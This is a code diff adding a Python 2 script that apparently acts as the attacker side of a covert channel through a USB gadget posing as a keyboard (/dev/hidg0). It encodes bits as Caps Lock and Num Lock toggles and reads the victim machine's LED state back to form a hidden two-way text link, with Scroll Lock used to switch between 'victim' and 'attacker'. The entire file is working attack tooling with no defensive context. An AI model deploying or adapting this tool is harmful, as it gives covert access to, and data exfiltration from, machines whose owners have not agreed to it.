@@ -1,0 +1,165 @@
+#!/usr/bin/python
+
+import os
+import pty
+import select
+import sys
+import termios
+import time
+import tty
+
+try:
+  is_a_tty = (os.environ['NOTTY'] != "1")
+except:
+  is_a_tty = True
+
+try:
+  flog_file = os.environ['FLOG']
+  flog = open(flog_file, "w")
+except:
+  flog = False
+
+
+def shutdown():
+  if is_a_tty:
+    # restore tty settings back
+    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+  # Toggle to victim (Send scroll-lock 0x47)
+  # Maybe not needed, but should clean things up
+  if sl:
+    dev_w.write("%c%c%c%c%c%c%c%c" % (0, 0, 71, 0, 0, 0, 0, 0))
+    dev_w.write("%c%c%c%c%c%c%c%c" % (0, 0, 0, 0, 0, 0, 0, 0))
+    dev_w.flush()
+  dev_r.close()
+  dev_w.close()
+  if flog:
+    flog.close()
+  sys.exit()
+
+dev_r = open("/dev/hidg0", "rb")
+dev_w = open("/dev/hidg0", "wb")
+
+if is_a_tty:
+  # save original tty setting then set it to raw mode
+  old_tty = termios.tcgetattr(sys.stdin)
+  tty.setraw(sys.stdin.fileno())
+
+nl=0
+cl=0
+sl=0
+
+last=2
+
+while 1:
+  # Read a byte from stdin if there is one.
+  r,w,e = select.select([ sys.stdin ], [], [], 0)
+  if sys.stdin in r:
+    d = os.read(sys.stdin.fileno(), 1)
+    #if d:
+    if d != "":
+      c = ord(d)
+
+      # Quit? (ctrl-Q)
+      if c == 17:
+        shutdown()
+
+      # Send a character
+      for i in xrange(8):
+        if c%2:
+          # Send one (caps-lock) 57?
+          if last == 1:
+            dev_w.write("%c%c%c%c%c%c%c%c" % (0, 0, 0, 0, 0, 0, 0, 0))
+          dev_w.write("%c%c%c%c%c%c%c%c" % (0, 0, 57, 0, 0, 0, 0, 0))
+          last=1
+
+        else:
+          # Send zero (num-lock) 83?
+          if last == 0:
+            dev_w.write("%c%c%c%c%c%c%c%c" % (0, 0, 0, 0, 0, 0, 0, 0))
+          dev_w.write("%c%c%c%c%c%c%c%c" % (0, 0, 83, 0, 0, 0, 0, 0))
+          last=0
+
+        c>>=1
+        time.sleep(0.005)
+
+        dev_w.flush()
+
+  time.sleep(0.01)
+
+  # Toggle to victim (Send scroll-lock 0x47)
+  dev_w.write("%c%c%c%c%c%c%c%c" % (0, 0, 71, 0, 0, 0, 0, 0))
+  dev_w.write("%c%c%c%c%c%c%c%c" % (0, 0, 0, 0, 0, 0, 0, 0))
+  dev_w.flush()
+  sys.stdout.flush()
+
+  # Flush up to the next Scroll_Lock
+  while True:
+    c=ord(dev_r.read(1))
+    # Num_lock - Zero
+    if (c&1 and not nl) or (not c&1 and nl):
+      nl = c&1
+    # Caps_lock - One
+    if (c&2 and not cl) or (not c&2 and cl):
+      cl = c&2
+    # Scroll_lock - toggle victim/attacker
+    if (c&4 and not sl) or (not c&4 and sl):
+      sl = c&4
+      break
+
+  sys.stdout.flush()
+  # Read a character
+  sl_flush = True
+  o = 0
+  for i in xrange(8):
+    r,w,e = select.select([ dev_r ], [], [], 2)
+    if dev_r in r:
+      c=ord(dev_r.read(1))
+    else:
+      print "ERR: Read timeout"
+      shutdown()
+
+    #c=ord(dev_r.read(1))
+
+    # Num_lock - Zero
+    if (c&1 and not nl) or (not c&1 and nl):
+      nl = c&1
+      o>>=1
+
+    # Caps_lock - One
+    if (c&2 and not cl) or (not c&2 and cl):
+      cl = c&2
+      o>>=1
+      o+=128
+
+    # Scroll_lock - toggle victim/attacker
+    if (c&4 and not sl) or (not c&4 and sl):
+      sl = c&4
+      sl_flush = False
+      break
+
+    sys.stdout.flush()
+
+  # Check that we got all bits. (0 bits is ok == no message)
+  if i > 0:
+    # Yes
+    if i == 7:
+      sys.stdout.write(chr(o))
+      sys.stdout.flush()
+      if flog: flog.write(chr(o))
+    # Too few bits (error)
+    else:
+      sys.stdout.write("*")
+      sys.stdout.flush()
+
+  # Wait up to the next Scroll_Lock
+  while sl_flush:
+    c=ord(dev_r.read(1))
+    # Scroll_lock - toggle victim/attacker
+    if (c&4 and not sl) or (not c&4 and sl):
+      sl = c&4
+      break
+
+  sys.stdout.flush()
+
+  time.sleep(0.010)
+
